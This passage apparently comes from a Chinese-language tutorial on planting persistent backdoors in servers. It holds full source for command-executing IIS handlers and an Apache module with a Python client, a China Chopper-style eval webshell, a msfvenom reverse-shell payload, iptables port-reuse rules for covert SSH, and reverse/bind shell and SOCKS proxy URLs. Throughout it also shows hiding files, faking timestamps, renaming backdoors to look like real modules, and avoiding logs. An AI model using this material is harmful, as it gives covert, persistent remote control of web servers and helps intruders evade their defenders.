--rsource -j ACCEPT# 关闭开关&gt;iptables -A INPUT -p tcp -m string --string &#39;threathunterleaving&#39; --algo bm -m recent --name letmein --remove -j ACCEPT&gt;iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN攻击端：#开启复用&gt;echo threathuntercoming | socat - tcp:192.168.0.110:80#ssh使用80端口进行登录ssh -p 80 root@192.168.0.110#关闭复用echo threathunterleaving | socat - tcp:192.168.0.110:80</code></pre><p><img src="./img/580.png" alt="image"></p><h3 id="文件处理"><a href="#文件处理" class="headerlink" title="文件处理"></a>文件处理</h3><pre><code>&gt;chattr +I shell.sh</code></pre><p><img src="./img/581.png" alt="image"></p><pre><code>&gt;vim .shell.sh</code></pre><p><img src="./img/582.png" alt="image"></p><pre><code>&gt;attrib +s +h +r 1.txt</code></pre><p><img src="./img/583.png" alt="image"></p><pre><code>&gt;touch -r 1.file 2.file 修改2file文件的时间跟1file时间相同</code></pre><h3 id="IIS-Bin-Backdoor"><a href="#IIS-Bin-Backdoor" class="headerlink" title="IIS_Bin_Backdoor"></a>IIS_Bin_Backdoor</h3><pre><code>From:https://github.com/WBGlIl/IIS_backdoorIIS_backdoor_dll.dl放入 web 目录的 bin 文件夹中配置 web.config 文件</code></pre><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>system.webServer</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modules</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>add</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>IIS_backdoor<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>IIS_backdoor_dll.IISModule<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modules</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>system.webServer</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>IIS_backdoor_shell.exe执行命令</code></pre><p><img src="./img/584.png" alt="image"></p><pre><code>使用IISBackdoor太明显，容易被看出是后门，这里对后门改名</code></pre><p><img src="./img/585.png" alt="image"><br><img src="./img/586.png" alt="image"><br><img src="./img/587.png" alt="image"></p><pre><code>重新生成解决方案，dll放入bin目录，web.config修改为</code></pre><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>system.webServer</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modules</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>add</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UrlRoutingModule<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UrlRoutingModule.IISModule<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modules</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>system.webServer</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>添加完之后会自动在模块中注册好</code></pre><p><img src="./img/588.png" alt="image"></p><pre><code>执行payload，msf生成raw格式payload，选择shellcode选项，raw文件拖入即可&gt;msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.108 LPORT=12138 -f raw -o /var/www/html/1.raw</code></pre><p><img src="./img/589.png" alt="image"></p><h3 id="IIS-NETDLL-Spy"><a href="#IIS-NETDLL-Spy" class="headerlink" title="IIS_NETDLL_Spy"></a>IIS_NETDLL_Spy</h3><pre><code>From:https://github.com/Ivan1ee/NetDLLSpy原作者提及三种方式，第一种编译代码为DLL新建aspx文件实例化后门类来执行命令，第二种是做httphandler映射可指定一个后缀执行命令保存文件在web服务器上，再读取结果。第三种是使用jsc.exe编译js脚本生成dll，添加映射菜刀连接。这里根据原作者的代码，进行了一下简单的修改，修改后的功能为添加httphandler映射指定一个后缀执行命令显示在页面上，不用保存在服务器中再访问。代码</code></pre><pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token keyword">using</span> <span class="token namespace">System</span><span class="token punctuation">;</span><span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Diagnostics</span><span class="token punctuation">;</span><span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>IO</span><span class="token punctuation">;</span><span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Text</span><span class="token punctuation">;</span><span class="token keyword">using</span> <span class="token namespace">System<span class="token punctuation">.</span>Web</span><span class="token punctuation">;</span><span class="token keyword">namespace</span> <span class="token namespace">IsapiModules</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Handler</span> <span class="token punctuation">:</span> <span class="token type-list"><span class="token class-name">IHttpHandler</span></span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token return-type class-name"><span class="token keyword">bool</span></span> IsReusable<span class="token punctuation">&#123;</span><span class="token keyword">get</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">ProcessRequest</span><span class="token punctuation">(</span><span class="token class-name">HttpContext</span> context<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token class-name"><span class="token keyword">string</span></span> input <span class="token operator">=</span> context<span class="token punctuation">.</span>Request<span class="token punctuation">.</span>Form<span class="token punctuation">[</span><span class="token string">"InternetInformationService"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment">//command</span><span class="token keyword">if</span> <span class="token punctuation">(</span>context<span class="token punctuation">.</span>Request<span class="token punctuation">.</span>Form<span class="token punctuation">[</span><span class="token string">"microsoft"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"iis"</span><span class="token punctuation">)</span><span class="token comment">//do command</span><span class="token punctuation">&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">cmdShell</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">cmdShell</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">string</span></span> input<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token class-name">Process</span> process <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">Process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>process<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>FileName <span class="token operator">=</span> <span class="token string">"cmd.exe"</span><span class="token punctuation">;</span>process<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>RedirectStandardOutput <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>process<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>UseShellExecute <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>process<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>Arguments <span class="token operator">=</span> <span class="token string">"/c "</span> <span class="token operator">+</span> input<span class="token punctuation">;</span>process<span class="token punctuation">.</span>StartInfo<span class="token punctuation">.</span>WindowStyle <span class="token operator">=</span> ProcessWindowStyle<span class="token punctuation">.</span>Hidden<span class="token punctuation">;</span>process<span class="token punctuation">.</span><span class="token function">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">StreamReader</span> output <span class="token operator">=</span> process<span class="token punctuation">.</span>StandardOutput<span class="token punctuation">;</span><span class="token class-name">String</span> result <span class="token operator">=</span> output<span class="token punctuation">.</span><span class="token function">ReadToEnd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>output<span class="token punctuation">.</span><span class="token function">Close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>output<span class="token punctuation">.</span><span class="token function">Dispose</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>HttpContext<span class="token punctuation">.</span>Current<span class="token punctuation">.</span>Response<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>保存为随意后缀，使用csc编译。&gt;C:\Windows\Microsoft.NET\Framework\v2.50727\csc.exe /t:library /r:System.Web.dll -out:C:\inetpub\wwwroot\Bin\SystemIO.dll C:\inetpub\wwwroot\bin\code.cs</code></pre><p><img src="./img/590.png" alt="image"></p><pre><code>Web.config文件添加&lt;system.webServer&gt;    &lt;handlers&gt;         &lt;add name=&quot;PageHandlerFactory-ISAPI-2.0-32&quot; path=&quot;*.xxx&quot; verb=&quot;*&quot; type=&quot;IsapiModules.Handler&quot; resourceType=&quot;Unspecified&quot; requireAccess=&quot;Script&quot; preCondition=&quot;integratedMode&quot; /&gt;     &lt;/handlers&gt; &lt;/system.webServer&gt;</code></pre><p><img src="./img/001.png" alt="image"></p><pre><code>打开IIS管理器，可以看到处理映射管理器中已经添加了模块。</code></pre><p><img src="./img/591.png" alt="image"></p><pre><code>现在随意访问个xxx后缀的文件</code></pre><p><img src="./img/592.png" alt="image"></p><pre><code>带参数访问microsoft=iis&amp;InternetInformationService=net user</code></pre><p><img src="./img/593.png" alt="image"><br><img src="./img/594.png" alt="image"></p><pre><code>第三种连接菜刀，这里也对代码修改了一下。</code></pre><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> System<span class="token punctuation">;</span> <span class="token keyword">import</span> System<span class="token punctuation">.</span>Web<span class="token punctuation">;</span> <span class="token keyword">import</span> System<span class="token punctuation">.</span><span class="token constant">IO</span><span class="token punctuation">;</span> <span class="token keyword">package</span> IsapiModule<span class="token punctuation">&#123;</span> <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Handler</span> <span class="token keyword">implements</span> <span class="token class-name">IHttpHandler</span><span class="token punctuation">&#123;</span> <span class="token keyword">function</span> IHttpHandler<span class="token punctuation">.</span><span class="token function">ProcessRequest</span><span class="token punctuation">(</span><span class="token parameter">context <span class="token operator">:</span> HttpContext</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> context<span class="token punctuation">.</span>Response<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token string">"404 Not Found"</span><span class="token punctuation">)</span> <span class="token keyword">var</span> <span class="token constant">I</span> <span class="token operator">=</span> context<span class="token punctuation">;</span> <span class="token keyword">var</span> Request <span class="token operator">=</span> <span class="token constant">I</span><span class="token punctuation">.</span>Request<span class="token punctuation">;</span> <span class="token keyword">var</span> Response <span class="token operator">=</span> <span class="token constant">I</span><span class="token punctuation">.</span>Response<span class="token punctuation">;</span> <span class="token keyword">var</span> Server <span class="token operator">=</span> <span class="token constant">I</span><span class="token punctuation">.</span>Server<span class="token punctuation">;</span> <span class="token function">eval</span><span class="token punctuation">(</span>context<span class="token punctuation">.</span>Request<span class="token punctuation">[</span><span class="token string">"Internet"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//pass</span><span class="token punctuation">&#125;</span> <span class="token keyword">function</span> <span class="token keyword">get</span> IHttpHandler<span class="token punctuation">.</span><span class="token function">IsReusable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> Boolean<span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>使用jsc编译&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\jsc.exe /t:library -out:C:\inetpub\wwwroot\Bin\IsapiModule.Handler.dll C:\inetpub\wwwroot\bin\code.js</code></pre><p><img src="./img/595.png" alt="image"></p><pre><code>编辑web.config，添加映射，这里指定的后缀是.iis&lt;system.webServer&gt; &lt;modules runAllManagedModulesForAllRequests=&quot;true&quot;/&gt; &lt;directoryBrowse enabled=&quot;true&quot;/&gt;&lt;staticContent&gt; &lt;mimeMap fileExtension=&quot;.json&quot; mimeType=&quot;application/json&quot; /&gt;  &lt;/staticContent&gt; &lt;handlers&gt; &lt;add name=&quot;PageHandlerFactory-ISAPI-2.0-32-1&quot; path=&quot;*.iis&quot; verb=&quot;*&quot; type=&quot;IsapiModule.Handler&quot; preCondition=&quot;integratedMode&quot;/&gt; &lt;/handlers&gt;&lt;/system.webServer&gt;已自动加入了映射。现在随便访问个iis后缀的文件。</code></pre><p><img src="./img/596.png" alt="image"><br><img src="./img/597.png" alt="image"></p><pre><code>可使用菜刀直接连接</code></pre><p><img src="./img/598.png" alt="image"><br><img src="./img/599.png" alt="image"></p><h3 id="IIS-RAID"><a href="#IIS-RAID" class="headerlink" title="IIS_RAID"></a>IIS_RAID</h3><pre><code>From:https://github.com/0x09AL/IIS-Raid在vs2019下编译在Functions.h中修改连接密码，passfile是dump下来的密码保存的位置，com_header是后门和服务器通信的请求头。</code></pre><p><img src="./img/600.png" alt="image"></p><pre><code>打开项目修改完你的密码，直接ctrl+B生成解决方案即可(这里生成的是release版本)Dll传到服务器，改个名字，执行添加模块&gt;C:\Windows\system32\inetsrv\APPCMD.EXE install module /name:IsapiDotNet /image:&quot;c:\windows\system32\inetsrv\IsapiDotNet.dll&quot; /add:true</code></pre><p><img src="./img/601.png" alt="image"></p><pre><code>在模块中可以看到已经存在了</code></pre><p><img src="./img/602.png" alt="image"></p><pre><code>远程连接&gt;python3 iis_controller.py --url http://192.168.0.98 --password thisismykey执行命令的方式是&gt;cmd +命令</code></pre><p><img src="./img/603.png" alt="image"></p><pre><code>Dump命令可以dump下来IIS站点的登录的信息，保存在设置的位置。Inject可以执行shellcodeCs/msf生成raw格式的shellcode&gt;inject 位置</code></pre><p><img src="./img/604.png" alt="image"></p><h3 id="JAVA-Web-Backdoor"><a href="#JAVA-Web-Backdoor" class="headerlink" title="JAVA Web Backdoor"></a>JAVA Web Backdoor</h3><pre><code>From:https://www.freebuf.com/articles/web/172753.htmlhttps://github.com/rebeyond/memShell当获取一个webshell或bashshell权限时，下载后门执行注入进程形成无文件复活后门下载后解压到任意web目录</code></pre><p><img src="./img/605.png" alt="image"></p><pre><code>得到2个jar文件执行，password设置为你的密码&gt;java -jar inject.jar password</code></pre><p><img src="./img/606.png" alt="image"></p><pre><code>注入成功，在web任意页面任意url执行命令http://192.168.0.121:8080/css/app.css?pass_the_world=password</code></pre><p><img src="./img/607.png" alt="image"></p><pre><code>可执行命令，反弹shell，上传/下载文件，列目录，读文件，添加代理，连接菜刀</code></pre><p><img src="./img/608.png" alt="image"></p><h3 id="Tomcat-JSP-HideShell"><a href="#Tomcat-JSP-HideShell" class="headerlink" title="Tomcat JSP HideShell"></a>Tomcat JSP HideShell</h3><pre><code>From:https://mp.weixin.qq.com/s/7b3Fyu_K6ZRgKlp6RkdYoAhttps://github.com/QAX-A-Team/HideShell把自己的shell和hideshell传入靶机，先访问自己的shell，目的是为了让 Tomcat 将它编译，并生成 JspServletWrapper 保存在 JspRuntimeContext 中。</code></pre><p><img src="./img/609.png" alt="image"></p><pre><code>再访问hideshell.jsp，点击hide你的shell。</code></pre><p><img src="./img/610.png" alt="image"></p><pre><code>已经隐藏了</code></pre><p><img src="./img/611.png" alt="image"><br><img src="./img/612.png" alt="image"></p><pre><code>再访问hideshell.jsp，可以看到隐藏后的shell的文件名。</code></pre><p><img src="./img/613.png" alt="image"></p><pre><code>访问看看</code></pre><p><img src="./img/614.png" alt="image"></p><pre><code>当然，也可以把hideshell自身隐藏了，那访问它的方式就是hidden-hideshell.jsp</code></pre><p><img src="./img/615.png" alt="image"></p><pre><code>目录里啥都没了</code></pre><p><img src="./img/616.png" alt="image"></p><pre><code>此方式隐藏之后请求不会产生日志</code></pre><p><img src="./img/617.png" alt="image"></p><pre><code>那如果把shelltest文件夹删掉权限还会在吗？</code></pre><p><img src="./img/618.png" alt="image"></p><pre><code>是在的</code></pre><p><img src="./img/619.png" alt="image"></p><h3 id="Apache-Module后门1"><a href="#Apache-Module后门1" class="headerlink" title="Apache Module后门1"></a>Apache Module后门1</h3><pre><code>From:https://github.com/WangYihang/Apache-HTTP-Server-Module-Backdoor生成模板结构&gt;apxs -g -n auth</code></pre><p><img src="./img/620.png" alt="image"></p><pre><code>编辑mod_auth.c文件</code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"httpd.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"http_config.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"http_protocol.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"ap_config.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">auth_handler</span><span class="token punctuation">(</span>request_rec <span class="token operator">*</span>r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token class-name">apr_array_header_t</span>    <span class="token operator">*</span>fields<span class="token punctuation">;</span>    <span class="token keyword">int</span>                            i<span class="token punctuation">;</span>    <span class="token class-name">apr_table_entry_t</span>           <span class="token operator">*</span>e <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> FLAG <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    fields <span class="token operator">=</span> <span class="token function">apr_table_elts</span><span class="token punctuation">(</span>r<span class="token operator">-></span>headers_in<span class="token punctuation">)</span><span class="token punctuation">;</span>    e <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">apr_table_entry_t</span> <span class="token operator">*</span><span class="token punctuation">)</span> fields<span class="token operator">-></span>elts<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> fields<span class="token operator">-></span>nelts<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>e<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>key<span class="token punctuation">,</span> <span class="token string">"Authorizations"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            FLAG <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>FLAG<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">char</span> <span class="token operator">*</span> command <span class="token operator">=</span> e<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>val<span class="token punctuation">;</span>        FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">popen</span><span class="token punctuation">(</span>command<span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> counter <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>counter<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            counter <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">ap_rwrite</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> counter<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">pclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> DONE<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> DECLINED<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">auth_register_hooks</span><span class="token punctuation">(</span><span class="token class-name">apr_pool_t</span> <span class="token operator">*</span>p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">ap_hook_handler</span><span class="token punctuation">(</span>auth_handler<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> APR_HOOK_MIDDLE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>module AP_MODULE_DECLARE_DATA auth_module <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    STANDARD20_MODULE_STUFF<span class="token punctuation">,</span>     <span class="token constant">NULL</span><span class="token punctuation">,</span>                  <span class="token comment">/* create per-dir    config structures */</span>    <span class="token constant">NULL</span><span class="token punctuation">,</span>                  <span class="token comment">/* merge  per-dir    config structures */</span>    <span class="token constant">NULL</span><span class="token punctuation">,</span>                  <span class="token comment">/* create per-server config structures */</span>    <span class="token constant">NULL</span><span class="token punctuation">,</span>                  <span class="token comment">/* merge  per-server config structures */</span>    <span class="token constant">NULL</span><span class="token punctuation">,</span>                  <span class="token comment">/* table of config file commands       */</span>    auth_register_hooks  <span class="token comment">/* register hooks                      */</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre><code>编译后重启apache&gt;apxs -i -a -c mod_auth.c &amp;&amp; service apache2 restart</code></pre><p><img src="./img/621.png" alt="image"></p><pre><code>原文件接受的头是backdoor太明显，这里换成了Authorizations</code></pre><p><img src="./img/622.png" alt="image"></p><pre><code>或使用python来执行</code></pre><p><img src="./img/623.png" alt="image"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> command<span class="token punctuation">)</span><span class="token punctuation">:</span>    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"Authorizations"</span><span class="token punctuation">:</span> command    <span class="token punctuation">&#125;</span>    url <span class="token operator">=</span> <span class="token string">"http://%s:%d/"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span>    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    content <span class="token operator">=</span> response<span class="token punctuation">.</span>content    <span class="token keyword">print</span> content<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Usage : "</span>        <span class="token keyword">print</span> <span class="token string">"\tpython %s [HOST] [PORT]"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    host <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    port <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        command <span class="token operator">=</span> <span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token string">"$ "</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> command <span class="token operator">==</span> <span class="token string">"exit"</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        exploit<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> command<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Apache-Module后门2"><a href="#Apache-Module后门2" class="headerlink" title="Apache Module后门2"></a>Apache Module后门2</h3><pre><code>From:https://github.com/VladRico/apache2_BackdoorMod.load文件传入/etc/apache2/mods-available/目录，.so文件传入/usr/lib/apache2/modules/目录启动后门模块，重启apache&gt;a2enmod backdoor&amp;service apache2 restart</code></pre><p><img src="./img/624.png" alt="image"></p><pre><code>Cookie里添加字段password=backdoor访问http://ip/ping返回如下图说明后门正常允许</code></pre><p><img src="./img/625.png" alt="image"></p><pre><code>访问http://ip/bind/12345 开启正向连接，攻击机执行nc ip 12345即可</code></pre><p><img src="./img/626.png" alt="image"></p><pre><code>访问http://ip/revtty/192.168.0.107/12138 开启反向连接，攻击机109执行nc监听12138即可</code></pre><p><img src="./img/627.png" alt="image"></p><pre><code>访问http://ip/proxy/1337开启socks代理</code></pre><p><img src="./img/628.png" alt="image"><br><img src="./img/629.png" alt="image"><br><img src="./img/630.png" alt="image"></p><pre><code>想要结束socks代理可执行&gt;echo &quot;imdonewithyou&quot; |nc 192.168.0.111 1337</code></pre><p><img src="./img/631.png" alt="image"></p><pre><code>即可结束socks代理以上原作者的文件命名backdoor太明显，可以自己修改文件重新编译创建模板结构命名为phpmodev</code></pre><p><img src="./img/632.png" alt="image"><br><img src="./img/633.png" alt="image"></p><pre><code>修改cookie内容为迷惑字段Authorizations=PHPSESSIONID</code></pre><p><img src="./img/634.png" alt="image"></p><h3 id="Apache-Module后门3"><a href="#Apache-Module后门3" class="headerlink" title="Apache Module后门3"></a>Apache 